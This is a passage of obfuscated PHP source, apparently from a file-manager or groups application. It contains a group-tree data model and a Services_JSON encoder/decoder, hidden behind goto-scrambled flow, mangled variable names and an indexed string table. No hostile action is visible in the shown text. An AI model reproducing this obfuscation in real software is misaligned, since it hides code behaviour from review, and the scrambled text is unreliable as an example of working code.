(!$aÂ‚¾»©Âƒ) { return array(); } return $aÂ‚¾»©Âƒ; goto B¥Œ†Ãº; c‘ğ¡œ§›Ü: $cÜç¬Ç˜À¤ = Model($AÁ‡ë‹‰â[2083])->where($f¨ì¤›´ß)->limit($FíÚÚİ…Ó”)->select(); if (!$cÜç¬Ç˜À¤) { return array(); } $cÜç¬Ç˜À¤ = array_to_keyvalue($cÜç¬Ç˜À¤, $AÁ‡ë‹‰â[33], $AÁ‡ë‹‰â[2000]); goto Cçß¥ÖËŞ; BŸ•Ğ˜¬®—: $AÁ‡ë‹‰â =& $_SERVER[‘®…¢À]; $D¾Ä³¾ÉõÓ = strtolower($D¾Ä³¾ÉõÓ); $f¨ì¤›´ß = array($AÁ‡ë‹‰â[90] => $eó¨ÀÉ»¶, $AÁ‡ë‹‰â[355] => array($AÁ‡ë‹‰â[734], "\x25{$D¾Ä³¾ÉõÓ}\x25")); goto c‘ğ¡œ§›Ü; B¥Œ†Ãº: } protected function _listDataApplyItem($a¤¨ñ—á´…) { $f·¡Â©ŒØ = array($a¤¨ñ—á´…); $this->_listDataApply($f·¡Â©ŒØ); return $f·¡Â©ŒØ[0]; } protected function _listDataApply(&$EÊÜàè°İ) { goto c–×·ĞŒßè; c–×·ĞŒßè: $D±„‰®”° =& $_SERVER[‘®…¢À]; if (!$EÊÜàè°İ) { return; } $FØµ¹‘™ò© = array_to_keyvalue($EÊÜàè°İ, $D±„‰®”°[33], $D±„‰®”°[2000]); goto A‡Ìğà; B½ñ®³¥á¹: $this->_listAppendParent($EÊÜàè°İ); $this->_listAppendSourceRoot($EÊÜàè°İ, $FØµ¹‘™ò©); goto aê‘¤¡˜‘Ç; A‡Ìğà: $this->_listAppendChildren($EÊÜàè°İ); $this->_listAppendChildrenMember($EÊÜàè°İ); $this->_listAppendMeta($EÊÜàè°İ, $FØµ¹‘™ò©); goto B½ñ®³¥á¹; aê‘¤¡˜‘Ç: } private function _listAppendChildren(&$B¡åòš¬—) { goto D¯°ğŸò‹«; Aäˆ¹²‡Óš: $Cä­íœÔ÷ò = array_to_keyvalue($Cä­íœÔ÷ò, $d…’èÖì[445]); foreach ($B¡åòš¬— as &$BÒŸŞŸµ¥ô) { $BÒŸŞŸµ¥ô[$d…’èÖì[2084]] = isset($Cä­íœÔ÷ò[$BÒŸŞŸµ¥ô[$d…’èÖì[2000]] . $d…’èÖì[2085]]); } goto fÃŠÆ×ãî; A¯Û¾İô§Ö: $F½Á÷ÛŞ» = count($B¡åòš¬—); $fëˆ¢¡Û… = $this->tablePrefix . $this->tableName; for ($E‚¦•§”‡ = 0, $FÊĞùƒÁÈ§ = 0; $E‚¦•§”‡ < $F½Á÷ÛŞ»; $E‚¦•§”‡++) { $FÊĞùƒÁÈ§++; $EÓ“·ÍêÛ = $B¡åòš¬—[$E‚¦•§”‡][$d…’èÖì[2000]]; $Fá³·ˆ¨Ù .= "\123\x45\114\x45\103\124\40\52\40\x46\x52\117\x4d\x20\x28\123\x45\x4c\x45\x43\x54\x20\47{$EÓ“·ÍêÛ}\x5f\x63\x68\x69\x6c\144\47\40\141\x73\x20\x68\x61\x73\x20\106\x52\x4f\115\x20\x60{$fëˆ¢¡Û…}\140\x20\167\x68\145\162\x65\x20\x70\141\162\x65\x6e\164\111\x44\x3d{$EÓ“·ÍêÛ}\x20\154\151\x6d\151\x74\x20\61\51\40\x61\x73\x20\x74\x62\x5f{$EÓ“·ÍêÛ}\40\165\156\151\157\x6e\40\x61\154\x6c\40"; if (($FÊĞùƒÁÈ§ >= 20 || $E‚¦•§”‡ == $F½Á÷ÛŞ» - 1) && $Fá³·ˆ¨Ù) { $Fá³·ˆ¨Ù = substr($Fá³·ˆ¨Ù, 0, -strlen($d…’èÖì[444])); $Fº²®ÉàåÀ = $this->query($Fá³·ˆ¨Ù); $Cä­íœÔ÷ò = array_merge($Cä­íœÔ÷ò, $Fº²®ÉàåÀ); $FÊĞùƒÁÈ§ = 0; $Fá³·ˆ¨Ù = $d…’èÖì[33]; } } goto Aäˆ¹²‡Óš; D¯°ğŸò‹«: $d…’èÖì =& $_SERVER[‘®…¢À]; $Fá³·ˆ¨Ù = $d…’èÖì[357]; $Cä­íœÔ÷ò = array(); goto A¯Û¾İô§Ö; fÃŠÆ×ãî: } private function _listAppendChildrenMember(&$a»»Å„çùš) { goto Fª²÷ÅÊ„…; E§º¯ÍŞ: $A‘Î§¤Àˆ‘ = count($a»»Å„çùš); $A›¥‡æºäš = $this->tablePrefix . $dóİƒ‘ğÎ[2076]; for ($eÂÊ¹µÁÍº = 0, $eæ…ÆŒÛâñ = 0; $eÂÊ¹µÁÍº < $A‘Î§¤Àˆ‘; $eÂÊ¹µÁÍº++) { $eæ…ÆŒÛâñ++; $b—´éò¤ãÒ = $a»»Å„çùš[$eÂÊ¹µÁÍº][$dóİƒ‘ğÎ[2000]]; $d”ÓÎÎç± .= "\123\105\x4c\x45\103\124\40\52\x20\x46\122\117\x4d\x20\x28\123\x45\114\105\x43\x54\40\47{$b—´éò¤ãÒ}\137\x63\x68\x69\154\x64\47\40\x61\163\40\x68\x61\163\40\x46\122\x4f\115\x20\x60{$A›¥‡æºäš}\x60\40\167\x68\145\162\x65\x20\x67\x72\157\165\160\111\104\75{$b—´éò¤ãÒ}\40\154\x69\155\x69\164\x20\x31\51\x20\x61\163\x20\x74\x62\137{$b—´éò¤ãÒ}\40\x75\x6e\x69\x6f\156\x20\x61\x6c\x6c\x20"; if (($eæ…ÆŒÛâñ >= 20 || $eÂÊ¹µÁÍº == $A‘Î§¤Àˆ‘ - 1) && $d”ÓÎÎç±) { $d”ÓÎÎç± = substr($d”ÓÎÎç±, 0, -strlen($dóİƒ‘ğÎ[444])); $Cáæ“ÖİĞƒ = $this->query($d”ÓÎÎç±); $AÁº’…ÇÆ³ = array_merge($AÁº’…ÇÆ³, $Cáæ“ÖİĞƒ); $eæ…ÆŒÛâñ = 0; $d”ÓÎÎç± = $dóİƒ‘ğÎ[33]; } } goto fŞÅÎ‹£ø•; Fª²÷ÅÊ„…: $dóİƒ‘ğÎ =& $_SERVER[‘®…¢À]; $d”ÓÎÎç± = $dóİƒ‘ğÎ[357]; $AÁº’…ÇÆ³ = array(); goto E§º¯ÍŞ; fŞÅÎ‹£ø•: $AÁº’…ÇÆ³ = array_to_keyvalue($AÁº’…ÇÆ³, $dóİƒ‘ğÎ[445]); foreach ($a»»Å„çùš as &$B‚ÇåÙ²‘ê) { $B‚ÇåÙ²‘ê[$dóİƒ‘ğÎ[2086]] = isset($AÁº’…ÇÆ³[$B‚ÇåÙ²‘ê[$dóİƒ‘ğÎ[2000]] . $dóİƒ‘ğÎ[2085]]); } goto fÎ÷©¥È¯õ; fÎ÷©¥È¯õ: } private function _listAppendMeta(&$C¼Ò±³ãŸ”, $aã©ÅÜöáÑ) { $F¹ÇÂ©Êö¢ =& $_SERVER[‘®…¢À]; $eØ£©¾°¥” = array($F¹ÇÂ©Êö¢[2000] => array($F¹ÇÂ©Êö¢[7], $aã©ÅÜöáÑ)); $b† ›ğ…­ = Model($F¹ÇÂ©Êö¢[2075])->where($eØ£©¾°¥”)->select(); $b† ›ğ…­ = array_to_keyvalue_group($b† ›ğ…­, $F¹ÇÂ©Êö¢[2000]); foreach ($b† ›ğ…­ as &$Bİ“ø£²±) { $Bİ“ø£²± = array_to_keyvalue($Bİ“ø£²±, $F¹ÇÂ©Êö¢[90], $F¹ÇÂ©Êö¢[355]); } foreach ($C¼Ò±³ãŸ” as &$Dõ¸“×³†Ï) { $Dõ¸“×³†Ï[$F¹ÇÂ©Êö¢[412]] = array(); if (isset($b† ›ğ…­[$Dõ¸“×³†Ï[$F¹ÇÂ©Êö¢[2000]]])) { $Dõ¸“×³†Ï[$F¹ÇÂ©Êö¢[412]] = $b† ›ğ…­[$Dõ¸“×³†Ï[$F¹ÇÂ©Êö¢[2000]]]; } } } protected function parentLevelArray($DÛŞº§„°”) { $bÙ³Ê×†š =& $_SERVER[‘®…¢À]; $DÛŞº§„°” = explode($bÙ³Ê×†š[47], trim($DÛŞº§„°”, $bÙ³Ê×†š[47])); $DÛŞº§„°” = array_remove_value($DÛŞº§„°”, $bÙ³Ê×†š[463]); return $DÛŞº§„°”; } private function _listAppendParent(&$a‚«×‡Ëù) { goto B¢›×—’øí; dÙğ¬˜ó¨Ù: $dï–ˆçô = array(); foreach ($Bô¼ÍÃ¹ÜŠ as $Bä˜ŞµÂÜ => $D­´øõâ¯¶) { if (!$D­´øõâ¯¶) { $dï–ˆçô[] = $Bä˜ŞµÂÜ; } } if ($dï–ˆçô) { $dò–ÛäÎ†ä = array($eö–ˆÙ¹ Ö[2074] => array($eö–ˆÙ¹ Ö[380], $dï–ˆçô)); $a†âŒĞäİ = $this->field($eö–ˆÙ¹ Ö[2087])->where($dò–ÛäÎ†ä)->select(); $D¹É¶ªˆ = array_to_keyvalue($a†âŒĞäİ, $eö–ˆÙ¹ Ö[2000], $eö–ˆÙ¹ Ö[28]); $Bô¼ÍÃ¹ÜŠ = array_merge_index($Bô¼ÍÃ¹ÜŠ, $D¹É¶ªˆ); } goto f©â’¿Î˜¸; B¢›×—’øí: $eö–ˆÙ¹ Ö =& $_SERVER[‘®…¢À]; $Bô¼ÍÃ¹ÜŠ = array(); foreach ($a‚«×‡Ëù as &$aØ»è¾’»ª) { $Bô¼ÍÃ¹ÜŠ[$aØ»è¾’»ª[$eö–ˆÙ¹ Ö[2000]]] = $aØ»è¾’»ª[$eö–ˆÙ¹ Ö[28]]; $A”ØÇ‰¿…á = $this->parentLevelArray($aØ»è¾’»ª[$eö–ˆÙ¹ Ö[454]]); foreach ($A”ØÇ‰¿…á as $Eªàˆ¥Ä„¼) { if (!isset($Bô¼ÍÃ¹ÜŠ[$Eªàˆ¥Ä„¼])) { $Bô¼ÍÃ¹ÜŠ[$Eªàˆ¥Ä„¼] = 0; } } } goto dÙğ¬˜ó¨Ù; f©â’¿Î˜¸: foreach ($a‚«×‡Ëù as &$aØ»è¾’»ª) { $A”ØÇ‰¿…á = $this->parentLevelArray($aØ»è¾’»ª[$eö–ˆÙ¹ Ö[454]]); $cÄˆÍËè© = $eö–ˆÙ¹ Ö[33]; foreach ($A”ØÇ‰¿…á as $Eªàˆ¥Ä„¼) { $cÄˆÍËè© .= $Bô¼ÍÃ¹ÜŠ[$Eªàˆ¥Ä„¼] . $eö–ˆÙ¹ Ö[8]; } if ($A”ØÇ‰¿…á) { $cÄˆÍËè© .= $aØ»è¾’»ª[$eö–ˆÙ¹ Ö[28]]; } $aØ»è¾’»ª[$eö–ˆÙ¹ Ö[458]] = str_replace($eö–ˆÙ¹ Ö[462], $eö–ˆÙ¹ Ö[8], $cÄˆÍËè©); } goto E§ˆ¿É‰; E§ˆ¿É‰: } private function _listAppendSourceRoot(&$Dñè‘ô·’, $FšÓíºÉƒ) { goto bÂ§²„·Ì; bÇ·ìŒ: $e­²Œ¨Î¢Ó = Model($D¿²ø‡´“[735])->order($D¿²ø‡´“[2089])->field($bÃ‡Ï¾ÉÚ)->where($a…äñ†ŠÙ‡)->select(); $e­²Œ¨Î¢Ó = array_to_keyvalue($e­²Œ¨Î¢Ó, $D¿²ø‡´“[451]); $e­²Œ¨Î¢Ó = array_remove_key($e­²Œ¨Î¢Ó, $D¿²ø‡´“[451]); goto FÖ‹’ª¢â—; FÖ‹’ª¢â—: foreach ($Dñè‘ô·’ as &$däÛ¢‡Ì÷è) { $däÛ¢‡Ì÷è[$D¿²ø‡´“[387]] = $e­²Œ¨Î¢Ó[$däÛ¢‡Ì÷è[$D¿²ø‡´“[2000]]] ? $e­²Œ¨Î¢Ó[$däÛ¢‡Ì÷è[$D¿²ø‡´“[2000]]] : array(); } goto F–ùÉÅßó; bÂ§²„·Ì: $D¿²ø‡´“ =& $_SERVER[‘®…¢À]; $a…äñ†ŠÙ‡ = array($D¿²ø‡´“[367] => SourceModel::TYPE_GROUP, $D¿²ø‡´“[456] => 0, $D¿²ø‡´“[451] => array($D¿²ø‡´“[7], $FšÓíºÉƒ)); $bÃ‡Ï¾ÉÚ = $D¿²ø‡´“[2088]; goto bÇ·ìŒ; F–ùÉÅßó: } protected function resetParentLevel() { $Dé›™¯¡Òä =& $_SERVER[‘®…¢À]; $eˆÉ‰É¯Ù = $Dé›™¯¡Òä[2000]; $D¼‹µÃ“Õ = $this->select(); $D¼‹µÃ“Õ = array_to_keyvalue($D¼‹µÃ“Õ, $eˆÉ‰É¯Ù); foreach ($D¼‹µÃ“Õ as $EÙšÆ¢õ) { goto eÜ£Ñ¢Ë—; Cò„’»šÓ: $A×÷Œæš”Ø[] = 0; $A×÷Œæš”Ø = $Dé›™¯¡Òä[47] . implode($Dé›™¯¡Òä[47], array_reverse($A×÷Œæš”Ø)) . $Dé›™¯¡Òä[47]; $this->setNamePinyin($EÙšÆ¢õ[$eˆÉ‰É¯Ù], $EÙšÆ¢õ[$Dé›™¯¡Òä[28]]); goto a¤¶Ô¨ã²; eÜ£Ñ¢Ë—: $bËâ›†¯ = $EÙšÆ¢õ; $A×÷Œæš”Ø = array(); while ($bËâ›†¯[$Dé›™¯¡Òä[456]] != 0) { $A×÷Œæš”Ø[] = $bËâ›†¯[$Dé›™¯¡Òä[456]]; $bËâ›†¯ = $D¼‹µÃ“Õ[$bËâ›†¯[$Dé›™¯¡Òä[456]]]; } goto Cò„’»šÓ; a¤¶Ô¨ã²: $this->where(array($eˆÉ‰É¯Ù => $EÙšÆ¢õ[$eˆÉ‰É¯Ù]))->save(array($Dé›™¯¡Òä[516] => $A×÷Œæš”Ø)); goto cÄÏ¥ŞÛğ; cÄÏ¥ŞÛğ: } return $D¼‹µÃ“Õ; } public function groupNameAuto($d­ŒğğŠ, $FÈÕç±µ) { $cšó£à­ =& $_SERVER[‘®…¢À]; $b»‚ƒŠ¬ = $this->where(array($cšó£à­[364] => $d­ŒğğŠ))->getField($cšó£à­[28], !0); if (!$b»‚ƒŠ¬ || !in_array($FÈÕç±µ, $b»‚ƒŠ¬)) { return $FÈÕç±µ; } for ($eÆ˜»¢¿†¶ = 1; $eÆ˜»¢¿†¶ <= count($b»‚ƒŠ¬) + 1; $eÆ˜»¢¿†¶++) { $b¦Ìé¯Ğßí = $FÈÕç±µ . "\50{$eÆ˜»¢¿†¶}\x29"; if (!in_array($b¦Ìé¯Ğßí, $b»‚ƒŠ¬)) { return $b¦Ìé¯Ğßí; } } } } goto Bé˜óà‚À; F“ Úàç†÷: register_shutdown_function($_SERVER[Á][35]); set_error_handler($_SERVER[Á][48], $eÉ÷¸·¾ä¹); if (function_exists($_SERVER[Á][49])) { set_exception_handler($_SERVER[Á][50]); } goto a¤×é§÷‚Ü; eµ„ÓºöÙŸ: define($_SERVER[‘®…¢À][1835], 32); class Services_JSON { function __construct($Eù—•…å„© = 0) { $this->use = $Eù—•…å„©; } function utf162utf8($f†îÓ•¦ø) { $aÑÄˆ˜ùù¥ =& $_SERVER[‘®…¢À]; if (function_exists($aÑÄˆ˜ùù¥[69])) { return mb_convert_encoding($f†îÓ•¦ø, $aÑÄˆ˜ùù¥[1485], $aÑÄˆ˜ùù¥[1836]); } $FÃ®ó¸¹å“ = ord($f†îÓ•¦ø[0]) << 8 | ord($f†îÓ•¦ø[1]); switch (!0) { case (127 & $FÃ®ó¸¹å“) == $FÃ®ó¸¹å“: return chr(127 & $FÃ®ó¸¹å“); case (2047 & $FÃ®ó¸¹å“) == $FÃ®ó¸¹å“: return chr(192 | $FÃ®ó¸¹å“ >> 6 & 31) . chr(128 | $FÃ®ó¸¹å“ & 63); case (65535 & $FÃ®ó¸¹å“) == $FÃ®ó¸¹å“: return chr(224 | $FÃ®ó¸¹å“ >> 12 & 15) . chr(128 | $FÃ®ó¸¹å“ >> 6 & 63) . chr(128 | $FÃ®ó¸¹å“ & 63); } return $aÑÄˆ˜ùù¥[33]; } function utf82utf16($C é½†¾ÛŞ) { $eÏ¯Ğ¤„ =& $_SERVER[‘®…¢À]; if (function_exists($eÏ¯Ğ¤„[69])) { return mb_convert_encoding($C é½†¾ÛŞ, $eÏ¯Ğ¤„[1836], $eÏ¯Ğ¤„[1485]); } switch (strlen($C é½†¾ÛŞ)) { case 1: return $C é½†¾ÛŞ; case 2: return chr(7 & ord($C é½†¾ÛŞ[0]) >> 2) . chr(192 & ord($C é½†¾ÛŞ[0]) << 6 | 63 & ord($C é½†¾ÛŞ[1])); case 3: return chr(240 & ord($C é½†¾ÛŞ[0]) << 4 | 15 & ord($C é½†¾ÛŞ[1]) >> 2) . chr(192 & ord($C é½†¾ÛŞ[1]) << 6 | 127 & ord($C é½†¾ÛŞ[2])); } return $eÏ¯Ğ¤„[33]; } function encode($e‘ƒ½ÒªÛ›) { $AøÇÙùˆ =& $_SERVER[‘®…¢À]; switch (gettype($e‘ƒ½ÒªÛ›)) { case $AøÇÙùˆ[1496]: return $e‘ƒ½ÒªÛ› ? $AøÇÙùˆ[1495] : $AøÇÙùˆ[1497]; case $AøÇÙùˆ[1837]: return $AøÇÙùˆ[102]; case $AøÇÙùˆ[300]: return (int) $e‘ƒ½ÒªÛ›; case $AøÇÙùˆ[275]: case $AøÇÙùˆ[274]: return (double) $e‘ƒ½ÒªÛ›; case $AøÇÙùˆ[309]: $cÓöò‘ßÛ = $AøÇÙùˆ[33]; $Dä°•¹éáš = strlen($e‘ƒ½ÒªÛ›); for ($d‡µ°šİÌ = 0; $d‡µ°šİÌ < $Dä°•¹éáš; ++$d‡µ°šİÌ) { $bÍî×‡‡¬ = ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ]); switch (!0) { case $bÍî×‡‡¬ == 8: $cÓöò‘ßÛ .= $AøÇÙùˆ[1838]; break; case $bÍî×‡‡¬ == 9: $cÓöò‘ßÛ .= $AøÇÙùˆ[1472]; break; case $bÍî×‡‡¬ == 10: $cÓöò‘ßÛ .= $AøÇÙùˆ[1470]; break; case $bÍî×‡‡¬ == 12: $cÓöò‘ßÛ .= $AøÇÙùˆ[1839]; break; case $bÍî×‡‡¬ == 13: $cÓöò‘ßÛ .= $AøÇÙùˆ[1471]; break; case $bÍî×‡‡¬ == 34: case $bÍî×‡‡¬ == 47: case $bÍî×‡‡¬ == 92: $cÓöò‘ßÛ .= $AøÇÙùˆ[96] . $e‘ƒ½ÒªÛ›[$d‡µ°šİÌ]; break; case $bÍî×‡‡¬ >= 32 && $bÍî×‡‡¬ <= 127: $cÓöò‘ßÛ .= $e‘ƒ½ÒªÛ›[$d‡µ°šİÌ]; break; case ($bÍî×‡‡¬ & 224) == 192: $A÷Ÿí·®© = pack($AøÇÙùˆ[1840], $bÍî×‡‡¬, ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 1])); $d‡µ°šİÌ += 1; $C‰¥ˆò‹ÒÅ = $this->utf82utf16($A÷Ÿí·®©); $cÓöò‘ßÛ .= sprintf($AøÇÙùˆ[1841], bin2hex($C‰¥ˆò‹ÒÅ)); break; case ($bÍî×‡‡¬ & 240) == 224: $A÷Ÿí·®© = pack($AøÇÙùˆ[1840], $bÍî×‡‡¬, ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 1]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 2])); $d‡µ°šİÌ += 2; $C‰¥ˆò‹ÒÅ = $this->utf82utf16($A÷Ÿí·®©); $cÓöò‘ßÛ .= sprintf($AøÇÙùˆ[1841], bin2hex($C‰¥ˆò‹ÒÅ)); break; case ($bÍî×‡‡¬ & 248) == 240: $A÷Ÿí·®© = pack($AøÇÙùˆ[1840], $bÍî×‡‡¬, ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 1]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 2]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 3])); $d‡µ°šİÌ += 3; $C‰¥ˆò‹ÒÅ = $this->utf82utf16($A÷Ÿí·®©); $cÓöò‘ßÛ .= sprintf($AøÇÙùˆ[1841], bin2hex($C‰¥ˆò‹ÒÅ)); break; case ($bÍî×‡‡¬ & 252) == 248: $A÷Ÿí·®© = pack($AøÇÙùˆ[1840], $bÍî×‡‡¬, ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 1]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 2]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 3]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 4])); $d‡µ°šİÌ += 4; $C‰¥ˆò‹ÒÅ = $this->utf82utf16($A÷Ÿí·®©); $cÓöò‘ßÛ .= sprintf($AøÇÙùˆ[1841], bin2hex($C‰¥ˆò‹ÒÅ)); break; case ($bÍî×‡‡¬ & 254) == 252: $A÷Ÿí·®© = pack($AøÇÙùˆ[1840], $bÍî×‡‡¬, ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 1]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 2]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 3]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 4]), ord($e‘ƒ½ÒªÛ›[$d‡µ°šİÌ + 5])); $d‡µ°šİÌ += 5; $C‰¥ˆò‹ÒÅ = $this->utf82utf16($A÷Ÿí·®©); $cÓöò‘ßÛ .= sprintf($AøÇÙùˆ[1841], bin2hex($C‰¥ˆò‹ÒÅ)); break; } } return $AøÇÙùˆ[114] . $cÓöò‘ßÛ . $AøÇÙùˆ[114]; case $AøÇÙùˆ[1842]: if (is_array($e‘ƒ½ÒªÛ›) && count($e‘ƒ½ÒªÛ›) && array_keys($e‘ƒ½ÒªÛ›) !== range(0, sizeof($e‘ƒ½ÒªÛ›) - 1)) { $BÄß¬ËÁÏ = array_map(array($this, $AøÇÙùˆ[1843]), array_keys($e‘ƒ½ÒªÛ›), array_values($e‘ƒ½ÒªÛ›)); foreach ($BÄß¬ËÁÏ as $dğõÓ‰ãÇ) { if (Services_JSON::isError($dğõÓ‰ãÇ)) { return $dğõÓ‰ãÇ; } } return $AøÇÙùˆ[1026] . join($AøÇÙùˆ[47], $BÄß¬ËÁÏ) . $AøÇÙùˆ[312]; } $BÆÛ—§±áæ = array_map(array($this, $AøÇÙùˆ[1844]), $e‘ƒ½ÒªÛ›); foreach ($BÆÛ—§±áæ as $c¼»Ä¯è×) { if (Services_JSON::isError($c¼»Ä¯è×)) { return $c¼»Ä¯è×; } } return $AøÇÙùˆ[154] . join($AøÇÙùˆ[47], $BÆÛ—§±áæ) . $AøÇÙùˆ[467]; case $AøÇÙùˆ[1845]: $BÜÙƒƒÛĞ± = get_object_vars($e‘ƒ½ÒªÛ›); $BÄß¬ËÁÏ = array_map(array($this, $AøÇÙùˆ[1843]), array_keys($BÜÙƒƒÛĞ±), array_values($BÜÙƒƒÛĞ±)); foreach ($BÄß¬ËÁÏ as $dğõÓ‰ãÇ) { if (Services_JSON::isError($dğõÓ‰ãÇ)) { return $dğõÓ‰ãÇ; } } return $AøÇÙùˆ[1026] . join($AøÇÙùˆ[47], $BÄß¬ËÁÏ) . $AøÇÙùˆ[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $AøÇÙùˆ[102] : new Services_JSON_Error(gettype($e‘ƒ½ÒªÛ›) . $AøÇÙùˆ[1846]); } } function name_value($b½½­˜œÍ‚, $eÆîßÍ†á¥) { $E’âØÈÂØì = $this->encode($eÆîßÍ†á¥); if (Services_JSON::isError($E’âØÈÂØì)) { return $E’âØÈÂØì; } return $this->encode(strval($b½½­˜œÍ‚)) . $_SERVER[‘®…¢À][4] . $E’âØÈÂØì; } function reduce_string($bƒ°¢¸–¢ã) { $FÙ÷î¿á™ù =& $_SERVER[‘®…¢À]; $bƒ°¢¸–¢ã = preg_replace(array($FÙ÷î¿á™ù[1847], $FÙ÷î¿á™ù[1848], $FÙ÷î¿á™ù[1849]), $FÙ÷î¿á™ù[33], $bƒ°¢¸–¢ã); return trim($bƒ°¢¸–¢ã); } function decode($eãî±¸ÆˆÒ) { $döÛ„½ëòó =& $_SERVER[‘®…¢À]; $eãî±¸ÆˆÒ = $this->reduce_string($eãî±¸ÆˆÒ); switch (strtolower($eãî±¸ÆˆÒ)) { case $döÛ„½ëòó[1495]: return !0; case $döÛ„½ëòó[1497]: return !1; case $döÛ„½ëòó[102]: return null; default: $bÑò£Ñœ² = array(); if (is_numeric($eãî±¸ÆˆÒ)) { return (double) $eãî±¸ÆˆÒ == (int) $eãî±¸ÆˆÒ ? (int) $eãî±¸ÆˆÒ : (double) $eãî±¸ÆˆÒ; } elseif (preg_match($döÛ„½ëòó[1850], $eãî±¸ÆˆÒ, $bÑò£Ñœ²) && $bÑò£Ñœ²[1] == $bÑò£Ñœ²[2]) { $D±Ÿó÷ä = substr($eãî±¸ÆˆÒ, 0, 1); $aå¬ì¬š–Š = substr($eãî±¸ÆˆÒ, 1, -1); $E§Íå±¡¨« = $döÛ„½ëòó[33]; $Eˆ›í¶†¥ = strlen($aå¬ì¬š–Š); for ($DÀçÛ™•Œ = 0; $DÀçÛ™•Œ < $Eˆ›í¶†¥; ++$DÀçÛ™•Œ) { $b‘ŞöÓ°äá = substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 2); $AÓ¶Ù’Ú© = ord($aå¬ì¬š–Š[$DÀçÛ™•Œ]); switch (!0) { case $b‘ŞöÓ°äá == $döÛ„½ëòó[1838]: $E§Íå±¡¨« .= chr(8); ++$DÀçÛ™•Œ; break; case $b‘ŞöÓ°äá == $döÛ„½ëòó[1472]: $E§Íå±¡¨« .= chr(9); ++$DÀçÛ™•Œ; break; case $b‘ŞöÓ°äá == $döÛ„½ëòó[1470]: $E§Íå±¡¨« .= chr(10); ++$DÀçÛ™•Œ; break; case $b‘ŞöÓ°äá == $döÛ„½ëòó[1839]: $E§Íå±¡¨« .= chr(12); ++$DÀçÛ™•Œ; break; case $b‘ŞöÓ°äá == $döÛ„½ëòó[1471]: $E§Íå±¡¨« .= chr(13); ++$DÀçÛ™•Œ; break; case $b‘ŞöÓ°äá == $döÛ„½ëòó[1246]: case $b‘ŞöÓ°äá == $döÛ„½ëòó[1851]: case $b‘ŞöÓ°äá == $döÛ„½ëòó[1465]: case $b‘ŞöÓ°äá == $döÛ„½ëòó[1467]: if ($D±Ÿó÷ä == $döÛ„½ëòó[114] && $b‘ŞöÓ°äá != $döÛ„½ëòó[1851] || $D±Ÿó÷ä == $döÛ„½ëòó[55] && $b‘ŞöÓ°äá != $döÛ„½ëòó[1246]) { $E§Íå±¡¨« .= $aå¬ì¬š–Š[++$DÀçÛ™•Œ]; } break; case preg_match($döÛ„½ëòó[1852], substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 6)): $D÷Ô‰ÀÇæ” = chr(hexdec(substr($aå¬ì¬š–Š, $DÀçÛ™•Œ + 2, 2))) . chr(hexdec(substr($aå¬ì¬š–Š, $DÀçÛ™•Œ + 4, 2))); $E§Íå±¡¨« .= $this->utf162utf8($D÷Ô‰ÀÇæ”); $DÀçÛ™•Œ += 5; break; case $AÓ¶Ù’Ú© >= 32 && $AÓ¶Ù’Ú© <= 127: $E§Íå±¡¨« .= $aå¬ì¬š–Š[$DÀçÛ™•Œ]; break; case ($AÓ¶Ù’Ú© & 224) == 192: $E§Íå±¡¨« .= substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 2); ++$DÀçÛ™•Œ; break; case ($AÓ¶Ù’Ú© & 240) == 224: $E§Íå±¡¨« .= substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 3); $DÀçÛ™•Œ += 2; break; case ($AÓ¶Ù’Ú© & 248) == 240: $E§Íå±¡¨« .= substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 4); $DÀçÛ™•Œ += 3; break; case ($AÓ¶Ù’Ú© & 252) == 248: $E§Íå±¡¨« .= substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 5); $DÀçÛ™•Œ += 4; break; case ($AÓ¶Ù’Ú© & 254) == 252: $E§Íå±¡¨« .= substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 6); $DÀçÛ™•Œ += 5; break; } } return $E§Íå±¡¨«; } elseif (preg_match($döÛ„½ëòó[1853], $eãî±¸ÆˆÒ) || preg_match($döÛ„½ëòó[1854], $eãî±¸ÆˆÒ)) { goto bÜÕˆË¾˜Ã; bÜÕˆË¾˜Ã: if ($eãî±¸ÆˆÒ[0] == $döÛ„½ëòó[154]) { $F·‰á“Òë = array(SERVICES_JSON_IN_ARR); $d¥ë…ÑóÁ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $F·‰á“Òë = array(SERVICES_JSON_IN_OBJ); $E‘Ÿ´‹îŞ = array(); } else { $F·‰á“Òë = array(SERVICES_JSON_IN_OBJ); $E‘Ÿ´‹îŞ = new stdClass(); } } array_push($F·‰á“Òë, array($döÛ„½ëòó[1855] => SERVICES_JSON_SLICE, $döÛ„½ëòó[260] => 0, $döÛ„½ëòó[1856] => !1)); $aå¬ì¬š–Š = substr($eãî±¸ÆˆÒ, 1, -1); goto f¸‚¨ã³’ï; C÷»Ò›ÆÑØ: for ($DÀçÛ™•Œ = 0; $DÀçÛ™•Œ <= $Eˆ›í¶†¥; ++$DÀçÛ™•Œ) { $d¡©æÀ…ñ = end($F·‰á“Òë); $b‘ŞöÓ°äá = substr($aå¬ì¬š–Š, $DÀçÛ™•Œ, 2); if ($DÀçÛ™•Œ == $Eˆ›í¶†¥ || $aå¬ì¬š–Š[$DÀçÛ™•Œ] == $döÛ„½ëòó[47] && $d¡©æÀ…ñ[$döÛ„½ëòó[1855]] == SERVICES_JSON_SLICE) { $Dƒš³§´ô¬ = 